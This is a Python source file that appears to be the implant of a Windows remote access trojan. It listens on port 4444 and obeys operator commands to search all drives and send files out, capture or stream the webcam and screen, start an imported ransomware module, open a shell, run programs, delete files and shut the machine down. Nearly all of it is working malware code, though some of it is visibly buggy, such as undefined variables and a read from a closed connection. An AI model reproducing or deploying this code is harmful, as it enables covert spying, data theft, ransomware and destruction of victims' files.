global_ip = "ALVIN-PC"
global_port = 4444
import socket
import os, sys
from time import sleep
import win_reverse_shell as shell
import subprocess
import screenshoot, capture
import ransomewere

def set_ip():
    global ip_address, port_used
    ip_address = global_ip
    port_used = global_port
    configuration(ip_address, port_used)

def configuration(IP, PORT):
    global s, conn
    ip_addr = IP
    port = PORT
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip_addr, port))
    s.listen(5)
    conn, addr = s.accept()

def search_file(filename):
    try:
        driver_name = []
        pharse = ("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
        for driver in pharse:
            if os.path.isdir(f"{driver}:"):
                driver = driver + str(":\\")
                driver_name.append(driver)
        for drivers in driver_name:
            for root, dirsname, files in os.walk(drivers):
                for file_name in files:
                    if file_name == filename:
                        path_file = root + str("\\") + filename
                        return path_file

    except FileNotFoundError:
        return False

def cmd():
    while True:
        try:
            command = conn.recv(4000)
            command = command.decode()
            if ("download") in command:
                amount_file = conn.recv(4000)
                amount_file = int(amount_file.decode())
                counter = 0
                while True:
                    filename = conn.recv(5000)
                    filename = filename.decode()
                    file_path = search_file(filename)
                    if file_path == False:
                        conn.send(str("0xfaa2h").encode())
                        continue
                    buff_size = os.path.getsize(file_path)
                    _send = conn.send(str(buff_size).encode())
                    with open(file_path, "rb") as file:
                        data = file.read()
                        send_data = conn.send(data)
                        file.close()
                    counter += 1
                    if counter == amount_file:
                        break

            elif ("capture camera") in command:
                conn.close()
                s.close()
                capture.capture_camera()
                configuration(ip, port)

            elif ("stream screen") in command:
                conn.close()
                s.close()
                capture.screen_jack()
                configuration(ip, port)

            elif ("stream camera") in command:
                conn.close()
                s.close()
                capture.camera_jack()
                print("reconnecting....")
                configuration(ip, port)

            elif ("strat ransome") in command:
                conn.close()
                s.close()
                ransomewere.start()

            elif ("capture screen") in command:
                conn.close()
                s.close()
                capture.capture_screen()
                configuration(ip, port)

            elif ("upload") in command:
                amount_file = conn.recv(5000)
                amount_file = int(amount_file)
                counter = 0
                while True:
                    filename = conn.recv(6000)
                    filename = filename.decode()
                    path_file = conn.recv(5000)
                    path_file = path_file.decode()
                    recv_buff = conn.recv(5000)
                    recv_buff = int(recv_buff.decode())
                    full_path = path_file + str("\\") + filename
                    with open(full_path, "wb") as file:
                        data = conn.recv(recv_buff)
                        file.write(data)
                        file.close()
                    counter += 1
                    if counter == amount_file:
                        break

            elif ("shell") in command:
                conn.close()
                s.close()
                shell.active()
                configuration(ip, port)

            elif ("pwd") in command:
                path = os.getcwd()
                send_path = conn.send(path.encode())

            elif ("ls") in command:
                path = os.getcwd()
                _list = os.listdir(path)
                amount_file = len(_list)
                send_amount = conn.send(str(amount_file).encode())
                sleep(3)
                for dirs in _list:
                    conn.send(dirs.encode())
                    sleep(2)
                    if os.path.isfile(dirs):
                        file_args = ("file")
                        conn.send(file_args.encode())
                    elif os.path.isdir(dirs):
                        dirs_args = ("folder")
                        conn.send(dirs_args.encode())
                    sleep(2)

            elif ("shutdown") in command:
                times = conn.recv(3000)
                times = int(times.decode())
                comment = conn.recv(5000)
                comment = comment.decode()
                conn.close()
                s.close()
                if comment == ("0xfaa3h"):
                    os.system(f"shutdown /s /t {times}")
                else:
                    os.system(f'shutdown /s /t {times} /c "{comment}"')
                break
                
            elif ("restart") in command:
                conn.close()
                s.close()
                times = conn.recv(3000)
                times = int(times.decode())
                comment = conn.recv(5000)
                comment = comment.decode()
                if comment == ("0xfaa3h"):
                    os.system(f"shutdown /s /t {times}")
                else:
                    os.system(f'shutdown /s /t {times} /c "{comment}"')

            elif ("hibernate") in command:
                conn.close()
                s.close()
                os.system("shutdown /h")

            elif ("log off") in command:
                conn.close()
                s.close()
                os.system("shutdown /l")

            elif ("exit") in command:
                conn.close()
                s.close()
                break
                sys.exit()

            elif command == ("execute") or command == ("run"):
                name_program = conn.recv(7000)
                name_program = name_program.decode()
                if os.path.isfile(name_program) == False:
                    search_file(name_program)
                    os.system(f"{name_program}")
                    pass
                if name_program.endswith(".py"):
                    subprocess.run(f"python {name_program}")
                else:
                    subprocess.run(f"{name_program}")

            elif command == ("delete") or command == ("remove"):
                amount_file = conn.recv(3000)
                amount_file = int(amount_file.decode())
                counter = 0
                while True:
                    filename = conn.recv(5000)
                    filename = filename.decode()
                    file_path = search_file(filename)
                    if file_path == False:
                        conn.send(str("0xfaa4h").encode())
                        continue
                    os.remove(file_path)
                    conn.send(filename.encode())
                    counter += 1
                    if counter ==  amount_file:
                        break

        except ConnectionResetError:
            s.close()
            conn.close()
            configuration(ip, port)
            cmd()

        except BrokenPipeError:
            s.close()
            conn.close()
            configuration(ip, port)
            cmd()

set_ip()
cmd()